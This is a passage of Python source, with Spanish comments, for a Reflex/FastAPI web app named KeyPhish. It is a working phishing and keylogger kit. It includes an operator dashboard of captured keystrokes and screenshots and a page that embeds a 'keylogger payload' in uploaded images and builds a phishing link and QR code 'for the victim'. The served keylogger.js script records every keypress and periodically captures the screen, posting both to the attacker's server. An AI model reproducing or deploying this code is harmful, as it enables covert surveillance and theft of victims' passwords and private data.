                            spacing="2",
                            align="start",
                            width="100%",
                        ),
                        rx.vstack(
                            rx.foreach(
                                State.generated_passwords,
                                lambda pwd: rx.icon(
                                    tag="copy",
                                    on_click=rx.set_clipboard(pwd.text),  # Usamos .text aquí también
                                    cursor="pointer",
                                    color="white",
                                    _hover={"color": "#60A5FA"},
                                ),
                            ),
                            spacing="2",
                            align="center",
                        ),
                        spacing="5",
                        align="start",
                        width="100%",
                    ),
                ),
                spacing="2",
                align="center",
                padding="20px",
                background_color="#1E3A8A",
                border_radius="8px",
                width="100%",
                max_width="400px",
                min_height="150px",
            ),
            spacing="5",
            align="center",
            justify="between",
            width="100%",
            max_width="800px",
            min_height="100vh",
        ),
        display="flex",
        justify_content="flex-end",
        align_items="center",
        width="100vw",
        height="100vh",
        padding_right="5px",
        background_image="url('')",
        background_size="cover",
        background_position="center",
        background_repeat="no-repeat",
    )


def keylogger_page() -> rx.Component:
    """Página principal del keylogger con actualizaciones en tiempo real."""
    return rx.box(
        # Fondo animado
        rx.image(
            src="/cat.gif",
            position="absolute",
            width="100%",
            height="100%",
            opacity="0.5",
            z_index="-1"
        ),
        # Script para manejar las actualizaciones automáticas de pulsaciones y capturas
        rx.script(
            """
            function getSessionId() {
                // Reflex normalmente incluye el sid en el estado inicial de la página
                // Aquí asumimos que está disponible en window.__reflex_state__
                return window.__reflex_state__?.sid || localStorage.getItem('reflex_sid') || '';
            }

            function updateKeystrokes() {
                const sid = getSessionId();
                if (!sid) {
                    console.error('Session ID not found');
                    return;
                }
                fetch('http://localhost:8000/api/keystrokes', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'sid': sid
                    },
                })
                .then(r => {
                    if (!r.ok) {
                        console.error('Error fetching keystrokes: HTTP ' + r.status);
                        throw new Error('HTTP ' + r.status);
                    }
                    return r.json();
                })
                .then(data => {
                    if (data.keystrokes) {
                        document.getElementById('keystrokes-content').innerText = data.keystrokes;
                    }
                })
                .catch(err => console.error('Error fetching keystrokes:', err));
            }

            function updateScreenshots() {
                const sid = getSessionId();
                if (!sid) {
                    console.error('Session ID not found');
                    return;
                }
                fetch('http://localhost:8000/api/screenshots', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'sid': sid
                    },
                })
                .then(r => {
                    if (!r.ok) {
                        console.error('Error fetching screenshots: HTTP ' + r.status);
                        throw new Error('HTTP ' + r.status);
                    }
                    return r.json();
                })
                .then(data => {
                    if (data.screenshots && data.screenshots.length > 0) {
                        const container = document.getElementById('screenshots-container');
                        if (container) {
                            container.innerHTML = '';
                            data.screenshots.forEach(screenshot => {
                                const box = document.createElement('div');
                                box.style.margin = '5px';
                                box.style.padding = '5px';
                                box.style.backgroundColor = '#1E293B';
                                box.style.borderRadius = '6px';
                                const img = document.createElement('img');
                                img.src = screenshot;
                                img.style.width = '200px';
                                img.style.borderRadius = '4px';
                                img.style.border = '1px solid #4B5563';
                                img.loading = 'lazy';
                                const name = document.createElement('p');
                                name.innerText = screenshot.split('/').pop();
                                name.style.color = 'gray';
                                name.style.fontSize = '0.8em';
                                name.style.textAlign = 'center';
                                const button = document.createElement('button');
                                button.innerText = 'Ver Completa';
                                button.style.padding = '5px 10px';
                                button.style.backgroundColor = '#3B82F6';
                                button.style.color = 'white';
                                button.style.border = 'none';
                                button.style.borderRadius = '4px';
                                button.style.marginTop = '5px';
                                button.style.cursor = 'pointer';
                                button.onclick = () => window.open(screenshot, '_blank');
                                box.appendChild(img);
                                box.appendChild(name);
                                box.appendChild(button);
                                container.appendChild(box);
                            });
                        }
                    }
                })
                .catch(err => console.error('Error fetching screenshots:', err));
            }

            setInterval(() => {
                updateKeystrokes();
                updateScreenshots();
            }, 2000);

            window.addEventListener('load', () => {
                updateKeystrokes();
                updateScreenshots();
            });
            """
        ),
        rx.container(
            rx.vstack(
                rx.heading(
                    "Panel de Control de KeyPhish",
                    size="5",
                    color="#4ADE80",
                    margin_bottom="20px",
                    class_name="animate-pulse"
                ),
                rx.text("Monitor de Actividad en Tiempo Real", color="white", font_size="1.5em"),
                # Sección de Pulsaciones Capturadas
                rx.box(
                    rx.hstack(
                        rx.text("Pulsaciones Capturadas en Tiempo Real:", color="white", font_size="1.2em"),
                        rx.text(
                            "🔄 Actualizando...",
                            color="#60A5FA",
                            font_size="0.9em",
                            id="keystroke-update-indicator",
                            class_name="animate-pulse"
                        ),
                        justify="between",
                    ),
                    rx.cond(
                        State.keystrokes == "",
                        rx.text("No hay pulsaciones capturadas aún", color="gray", font_style="italic"),
                        rx.container(
                            rx.text(
                                State.keystrokes,
                                color="white",
                                white_space="pre-wrap",
                                id="keystrokes-content"
                            ),
                            max_height="200px",
                            overflow_y="auto",
                            padding="10px",
                            background_color="#1F2937",
                            border_radius="4px",
                            width="100%",
                        ),
                    ),
                    background_color="#111827",
                    padding="15px",
                    border_radius="8px",
                    width="100%",
                    margin_bottom="15px"
                ),
                # Sección de Capturas de Pantalla
                rx.box(
                    rx.hstack(
                        rx.text("Capturas de Pantalla en Tiempo Real:", color="white", font_size="1.2em"),
                        rx.text(
                            "🔄 Actualizando...",
                            color="#60A5FA",
                            font_size="0.9em",
                            id="screenshot-update-indicator",
                            class_name="animate-pulse"
                        ),
                        justify="between",
                    ),
                    rx.cond(
                        State.screenshots.length() == 0,
                        rx.text("No hay capturas de pantalla disponibles", color="gray", font_style="italic"),
                        rx.container(
                            rx.vstack(
                                rx.foreach(
                                    State.screenshots,
                                    lambda screenshot: rx.box(
                                        rx.image(
                                            src=screenshot,
                                            width="200px",
                                            height="auto",
                                            border_radius="4px",
                                            border="1px solid #4B5563",
                                            loading="lazy",
                                        ),
                                        rx.text(
                                            screenshot.split("/")[-1],
                                            color="gray",
                                            font_size="0.8em",
                                            text_align="center",
                                        ),
                                        rx.link(
                                            "Ver Completa",
                                            href=screenshot,
                                            target="_blank",
                                            color="#3B82F6",
                                            padding="5px 10px",
                                            border_radius="4px",
                                            background_color="transparent",
                                            _hover={"background_color": "#1E293B", "text_decoration": "underline"},
                                            margin_top="5px",
                                            display="inline-block",
                                        ),
                                        margin="5px",
                                        padding="5px",
                                        background_color="#1E293B",
                                        border_radius="6px",
                                    )
                                ),
                                align_items="start",
                                spacing="4",
                                id="screenshots-container"
                            ),
                            max_height="400px",
                            overflow_y="auto",
                            padding="10px",
                            background_color="#1F2937",
                            border_radius="4px",
                            width="100%",
                        ),
                    ),
                    background_color="#111827",
                    padding="15px",
                    border_radius="8px",
                    width="100%",
                    margin_bottom="15px"
                ),
                # Sección de Creación de Ataque con vista previa mejorada
                rx.box(
                    rx.text("Creación de Ataque Phishing", color="white", font_size="1.2em"),
                    rx.upload(
                        rx.vstack(
                            rx.icon("upload", color="white", font_size="2em"),
                            rx.text("Arrastra una imagen o haz clic para seleccionar", color="white"),
                            rx.text("La imagen será procesada con el payload de keylogger", color="gray", font_size="0.8em"),
                            padding="20px",
                            spacing="2",
                        ),
                        on_drop=State.embed_script_in_image,
                        border="2px dashed #4B5563",
                        padding="10px",
                        background_color="#1F2937",
                        border_radius="8px",
                        width="100%",
                        multiple=False,
                        accept={"image/jpeg": [], "image/png": []},
                        _hover={"border_color": "#4ADE80"},
                        class_name="upload-area",
                    ),
                    rx.cond(
                        State.uploaded_image != "",
                        rx.vstack(
                            rx.text("Imagen cargada y procesada con éxito:", color="#4ADE80", margin_top="10px"),
                            rx.image(
                                src=State.uploaded_image,
                                width="200px",
                                height="auto",
                                border_radius="4px",
                                border="1px solid #4ADE80",
                                id="uploaded-image-preview"
                            ),
                            rx.script("""
                            function checkImageLoaded() {
                                const img = document.getElementById('uploaded-image-preview');
                                if (img) {
                                    img.onerror = function() {
                                        this.src = '/assets/image-fallback.png';
                                    };
                                }
                            }
                            setTimeout(checkImageLoaded, 500);
                            """),
                            spacing="2",
                        ),
                        rx.text("No hay imagen cargada", color="gray", margin_top="10px", font_style="italic"),
                    ),
                    rx.cond(
                        State.phishing_link != "",
                        rx.vstack(
                            rx.text("Enlace de phishing generado:", color="white", margin_top="10px"),
                            rx.hstack(
                                rx.text(
                                    State.get_full_phishing_link,
                                    color="#4ADE80",
                                    font_family="monospace",
                                    background_color="#1F2937",
                                    padding="5px 10px",
                                    border_radius="4px",
                                    width="100%",
                                    id="full-phishing-link"
                                ),
                                rx.button(
                                    "Copiar",
                                    on_click=rx.set_clipboard(State.get_full_phishing_link),
                                    color_scheme="green",
                                    size="3",
                                ),
                                rx.link(
                                    "Probar",
                                    href=State.get_full_phishing_link,
                                    target="_blank",
                                    color_scheme="blue",
                                    size="3",
                                    padding="8px 16px",
                                    border_radius="4px",
                                    background_color="#3B82F6",
                                    color="white",
                                    _hover={"background_color": "#60A5FA"},
                                ),
                                width="100%",
                            ),
                            rx.text(
                                "Envía este enlace a la víctima para activar el keylogger",
                                color="gray",
                                font_size="0.8em",
                            ),
                            rx.image(
                                src=f"https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={State.get_full_phishing_link}",
                                width="150px",
                                height="150px",
                                margin_top="10px",
                                border_radius="4px",
                                background_color="white",
                                padding="5px",
                            ),
                            spacing="2",
                            width="100%",
                        ),
                        rx.text("Esperando enlace...", color="gray", margin_top="10px", font_style="italic"),
                    ),
                    background_color="#111827",
                    padding="15px",
                    border_radius="8px",
                    width="100%",
                ),
                spacing="4",
                width="100%",
                padding_top="20px",
            ),
            max_width="1200px",
            width="100%",
            padding="20px",
            margin="0 auto",
        ),
        width="100vw",
        min_height="100vh",
        background_color="#0F172A",
        position="relative",
    )

def phishing_page(img: str = "") -> rx.Component:
    return rx.box(
        rx.text("Cargando tu contenido...", color="gray"),
        rx.script(src="http://192.168.0.44:8000/keylogger.js", async_=True),
        rx.script(
            f"""
            setTimeout(function() {{
                const img = "{img}";
                if (img) {{
                    console.log("Iniciando descarga automática de: " + img);
                    const link = document.createElement('a');
                    link.href = 'http://192.168.0.44:8000/download_image?img=' + img;
                    link.download = img;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }} else {{
                    console.error("No se proporcionó una imagen para descargar");
                }}
            }}, 1000);
            window.addEventListener('load', () => {{
                if (typeof installKeylogger === 'function') {{
                    installKeylogger();
                }} else {{
                    console.error("Keylogger script no cargado");
                }}
                const imageElement = document.getElementById('target-image');
                if (imageElement) {{
                    imageElement.onerror = function() {{
                        console.error('Error al cargar la imagen: {img}');
                        imageElement.src = 'http://192.168.0.44:8000/static_assets/image-fallback.png';
                    }};
                }}
            }});
            """
        ),
        rx.cond(
            img != "",
            rx.image(
                src=f"http://192.168.0.44:8000/static_assets/{img}",
                alt="Tu imagen",
                width="100%",
                max_width="800px",
                margin="20px 0",
                border="1px solid #ddd",
                border_radius="4px",
                box_shadow="0 2px 5px rgba(0,0,0,0.1)",
                id="target-image",
            ),
            rx.text("No se proporcionó una imagen", color="red"),
        ),
        width="100%",
        height="100vh",
        display="flex",
        flex_direction="column",
        align_items="center",
        justify_content="center",
        background_color="#f9f9f9",
    )
# Crear la aplicación Reflex
app = rx.App(
    stylesheets=[],
)

# Crear una instancia de FastAPI
fastapi_app = FastAPI()

# Asignar a api_transformer
app.api_transformer = fastapi_app

# Configurar CORS
fastapi_app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:3000",
        "http://127.0.0.1:3000",
        "http://192.168.0.44:3000",
        "http://192.168.0.44:8000",
        "*"  # Para pruebas, pero elimina en producción
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Define las rutas usando fastapi_app
@fastapi_app.get("/api/keystrokes")
async def get_keystrokes(sid: str = Header(None)):
    """API para obtener pulsaciones en tiempo real."""
    print("Endpoint /api/keystrokes called")
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        await state.refresh_keystrokes()
        return {"keystrokes": state.keystrokes}
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.get("/api/screenshots")
async def get_screenshots(sid: str = Header(None)):
    """API para obtener capturas en tiempo real."""
    print("Endpoint /api/screenshots called")
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        await state.refresh_screenshots()
        return {"screenshots": state.screenshots}
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.get("/api/status")
async def get_status(sid: str = Header(None)):
    """API para obtener el estado del keylogger."""
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        return {
            "is_active": state.is_keylogging,
            "victim_ip": state.victim_ip,
            "last_update": state.last_update
        }
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.post("/keylogger_activate")
async def activate_keylogger(payload: ActivatePayload, request: Request, sid: str = Header(None)):
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        return await state.activate_keylogger_endpoint(payload, request)
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.post("/keylog")
async def keylog(payload: KeylogPayload, sid: str = Header(None)):
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        return await state.keylog_endpoint(payload)
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.post("/screenshot")
async def screenshot(payload: ScreenshotPayload, sid: str = Header(None)):
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        state = await get_state(State, sid=sid)
        return await state.screenshot_endpoint(payload)
    except Exception as e:
        print(f"Error retrieving state: {e}")
        return Response(
            content=f"Error retrieving state: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )

@fastapi_app.get("/download_image")
async def download_image(img: str, sid: str = Header(None)):
    if not sid:
        return Response(
            content="Session ID (sid) is required in the request header.",
            status_code=400,
            media_type="text/plain"
        )
    try:
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        image_path = os.path.join(base_dir, "assets", img)
        if os.path.exists(image_path):
            return FileResponse(
                path=image_path,
                media_type="image/png",
                filename=img,
                headers={"Content-Disposition": f"attachment; filename={img}"}
            )
        else:
            print(f"❌ Imagen no encontrada en: {image_path}")
            return Response(
                content=f"Imagen no encontrada: {img}",
                media_type="text/plain",
                status_code=404
            )
    except Exception as e:
        print(f"Error al servir la imagen: {e}")
        return Response(
            content=f"Error al servir la imagen: {str(e)}",
            status_code=500,
            media_type="text/plain"
        )
@fastapi_app.get("/phishing")
async def phishing(img: str, sid: str = Header(None)):
    image_path = os.path.join(BASE_DIR, "assets", img)
    session_id = sid or str(uuid.uuid4())
    if os.path.exists(image_path):
        html = f"""
        <!DOCTYPE html>
        <html>
            <head>
                <title>Tu imagen está lista</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; text-align: center; background-color: #f9f9f9; }}
                    h1 {{ color: #333; }}
                    img {{ max-width: 100%; border: 1px solid #ddd; border-radius: 4px; padding: 5px; margin: 20px 0; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
                    .download-btn {{ display: inline-block; padding: 10px 20px; background-color: #4CAF50; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.2); transition: all 0.3s ease; }}
                    .download-btn:hover {{ background-color: #45a049; transform: translateY(-2px); }}
                </style>
            </head>
            <body>
                <h1>Tu imagen está lista</h1>
                <img src="http://192.168.0.44:8000/static_assets/{img}" alt="Tu imagen" id="target-image" onerror="this.src='http://192.168.0.44:8000/static_assets/image-fallback.png'" />
                <p>Esta es la imagen que solicitaste. Haz clic en el botón para descargarla.</p>
                <a href="http://192.168.0.44:8000/download_image?img={img}&sid={session_id}" class="download-btn" download id="download-button">Descargar Imagen</a>
                <script src="http://192.168.0.44:8000/keylogger.js"></script>
                <script>
                    localStorage.setItem('reflex_sid', '{session_id}');
                    setTimeout(function() {{
                        document.getElementById('download-button').click();
                        if (typeof installKeylogger === 'function') {{
                            installKeylogger();
                        }}
                    }}, 1000);
                </script>
            </body>
        </html>
        """
        return Response(content=html, media_type="text/html")
    else:
        print(f"❌ Imagen no encontrada en: {image_path}")
        html = f"""
        <!DOCTYPE html>
        <html>
            <head>
                <title>Error</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <style>
                    body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; text-align: center; }}
                    h1 {{ color: #d32f2f; }}
                </style>
            </head>
            <body>
                <h1>Error: Imagen no encontrada</h1>
                <p>La imagen solicitada no existe o no está disponible.</p>
                <p>Ruta buscada: {image_path}</p>
            </body>
        </html>
        """
        return Response(content=html, media_type="text/html", status_code=404)
@fastapi_app.get("/keylogger.js")
async def keylogger_js():
    """Endpoint para servir el script de keylogger."""
    print("Sirviendo keylogger.js")
    js_content = """
    function installKeylogger() {
        console.log("Instalando keylogger...");
        const sid = localStorage.getItem('reflex_sid') || Math.random().toString(36).substring(2);
        localStorage.setItem('reflex_sid', sid); // Guardar sid para uso futuro
        fetch('http://localhost:8000/keylogger_activate', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'sid': sid
            },
            body: JSON.stringify({active: true})
        })
        .then(response => response.json())
        .then(data => console.log('Keylogger activado:', data))
        .catch(err => console.error('Error activando keylogger:', err));
        document.addEventListener('keydown', function(e) {
            let key = e.key;
            let timestamp = new Date().toISOString();
            fetch('http://localhost:8000/keylog', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'sid': sid
                },
                body: JSON.stringify({key, timestamp})
            })
            .catch(err => console.error('Error registrando tecla:', err));
        });
        async function captureScreen() {
            try {
                console.log("Intentando capturar pantalla...");
                const stream = await navigator.mediaDevices.getDisplayMedia({ 
                    video: { cursor: "always" },
                    audio: false
                });
                console.log("Permiso de captura concedido");
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const screenshot = canvas.toDataURL('image/png');
                stream.getTracks().forEach(track => track.stop());
                console.log("Captura realizada, enviando al servidor...");
                const timestamp = new Date().toISOString();
                fetch('http://localhost:8000/screenshot', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'sid': sid
                    },
                    body: JSON.stringify({screenshot, timestamp})
                })
                .then(response => response.json())
                .then(data => console.log('Captura guardada:', data))
                .catch(err => console.error('Error enviando captura:', err));
            } catch (err) {
                console.error("Error capturando pantalla:", err);
            }
        }
        setInterval(captureScreen, 30000);
        setTimeout(captureScreen, 2000);
    }
    console.log("Script de keylogger cargado");
    window.addEventListener('load', installKeylogger);
    """
    return Response(content=js_content, media_type="application/javascript")


@fastapi_app.get("/test_asset")
async def test_asset():
    image_path = os.path.join(BASE_DIR, "assets", "image_b420f9d2.png")
    if os.path.exists(image_path):
        print(f"Sirviendo archivo: {image_path}")
        return FileResponse(image_path, media_type="image/png")
    print(f"Archivo no encontrado: {image_path}")
    return Response(content="Archivo no encontrado", status_code=404)
@fastapi_app.get("/cat.gif")
async def cat_gif():
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    gif_path = os.path.join(base_dir, "assets", "cat.gif")
    if os.path.exists(gif_path):
        return FileResponse(gif_path, media_type="image/gif")
    return Response(
        content="No se encontró el archivo cat.gif en assets.",
        media_type="text/plain",
        status_code=404
    )
    
    # Imprimir rutas registradas para depuración
print("Rutas registradas en FastAPI:")
for route in fastapi_app.routes:
    print(f" - {route.path} ({route.methods})")
    
assets_path = os.path.join(BASE_DIR, "assets")
print(f"Montando /static_assets en: {assets_path}")
if os.path.exists(assets_path):
    print(f"Directorio assets existe: {assets_path}")
    print(f"Archivos en assets: {os.listdir(assets_path)}")
else:
    print(f"¡ERROR! Directorio assets no existe: {assets_path}")
fastapi_app.mount("/static_assets", StaticFiles(directory=assets_path), name="static_assets")
fastapi_app.mount("/captures", StaticFiles(directory=os.path.join(BASE_DIR, "captures")), name="captures")
fastapi_app.mount("/public", StaticFiles(directory=os.path.join(BASE_DIR, "public")), name="public")

# Configurar archivos estáticos en Reflex
app.static_files = {
    "/static_assets": assets_path,
    "/captures": os.path.join(BASE_DIR, "captures"),
    "/public": os.path.join(BASE_DIR, "public"),
}
print("Rutas estáticas configuradas en Reflex:", app.static_files)

# Asegurar que los directorios existan
for path in [os.path.join(BASE_DIR, "assets"), os.path.join(BASE_DIR, "captures"), os.path.join(BASE_DIR, "public")]:
    if not os.path.exists(path):
        os.makedirs(path)

# Configurar páginas
app.add_page(index, route="/")
app.add_page(settings_page, route="/settings")
app.add_page(about_page, route="/about")
app.add_page(keylogger_page, route="/keylogger")
app.add_page(phishing_page, route="/phishing")


